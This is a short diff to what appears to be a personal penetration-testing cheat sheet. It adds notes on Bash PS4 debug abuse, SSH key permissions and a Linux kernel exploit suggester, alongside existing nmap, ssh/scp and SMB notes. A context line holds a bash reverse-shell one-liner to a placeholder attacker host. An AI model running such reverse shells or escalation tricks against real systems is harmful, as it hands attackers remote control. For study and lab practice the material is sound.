@@ -13,6 +13,7 @@
   - bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
 - Bash:
   - Version < 4.2-048 - possible to create functions with names like paths
+  - Version < 4.4 - possible to abuse debug flag PS4
 
 ## Nmap
 - syntax: namp [options] ip
@@ -153,6 +154,7 @@
 - Ssh user@ip 
 - Ssh -i rsa_key user@ip 
 - Scp user@ip:/file/to/get /path/to/store 
+- Keys security: 600
 
 ## SMB
 
@@ -162,3 +164,5 @@ Protocol for sharing resources (files, printers, etc)
 1 - Default credentials
 2 - Samba server (usually insecure)
 
+## Kernel exploits
+- linux-exploit-suggester-2 - identifies applicable exploits to the kernel
